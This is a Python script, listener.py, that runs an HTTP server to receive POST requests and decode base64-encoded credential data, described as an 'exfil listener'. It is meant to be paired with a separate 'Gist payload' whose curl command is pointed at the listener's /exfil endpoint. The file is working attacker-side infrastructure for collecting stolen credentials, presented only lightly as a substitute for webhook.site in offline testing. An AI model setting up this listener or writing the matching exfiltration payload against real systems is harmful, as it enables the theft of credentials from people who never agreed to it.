"""
listener.py
Simple HTTP listener that captures incoming POST requests and decodes
base64-encoded credential data. Use as an alternative to webhook.site
for air-gapped or offline testing.

Usage:
    python listener.py [port]
    python listener.py 8443

Default port: 8080

Update the Gist payload curl URL to point to http://<YOUR_IP>:<PORT>/exfil
"""

import sys
import json
import base64
from http.server import HTTPServer, BaseHTTPRequestHandler
from datetime import datetime


class ExfilHandler(BaseHTTPRequestHandler):
    def do_POST(self):
        content_length = int(self.headers.get("Content-Length", 0))
        body = self.rfile.read(content_length).decode("utf-8", errors="replace")

        timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        print(f"\n{'='*60}")
        print(f"[{timestamp}] POST {self.path}")
        print(f"From: {self.client_address[0]}:{self.client_address[1]}")
        print(f"Content-Type: {self.headers.get('Content-Type', 'N/A')}")
        print(f"Content-Length: {content_length}")
        print(f"{'='*60}")

        try:
            data = json.loads(body)
            print("\n[*] Parsed JSON fields:")

            for key, value in data.items():
                print(f"\n--- {key} ---")
                try:
                    decoded = base64.b64decode(value).decode("utf-8", errors="replace")
                    print(f"[base64 decoded]:\n{decoded}")
                except Exception:
                    print(f"[raw value]: {value}")

        except json.JSONDecodeError:
            print(f"\n[*] Raw body:\n{body}")

        print(f"\n{'='*60}\n")

        self.send_response(200)
        self.send_header("Content-Type", "application/json")
        self.end_headers()
        self.wfile.write(b'{"status":"received"}')

    def do_GET(self):
        self.send_response(200)
        self.send_header("Content-Type", "text/plain")
        self.end_headers()
        self.wfile.write(b"Exfil listener active. Send POST to /exfil\n")

    def log_message(self, format, *args):
        pass  # Suppress default access log noise


def main():
    port = int(sys.argv[1]) if len(sys.argv) > 1 else 8080

    server = HTTPServer(("0.0.0.0", port), ExfilHandler)
    print(f"[*] Exfil listener started on 0.0.0.0:{port}")
    print(f"[*] Update Gist payload URL to: http://<YOUR_IP>:{port}/exfil")
    print(f"[*] Ctrl+C to stop\n")

    try:
        server.serve_forever()
    except KeyboardInterrupt:
        print("\n[*] Listener stopped.")
        server.server_close()


if __name__ == "__main__":
    main()
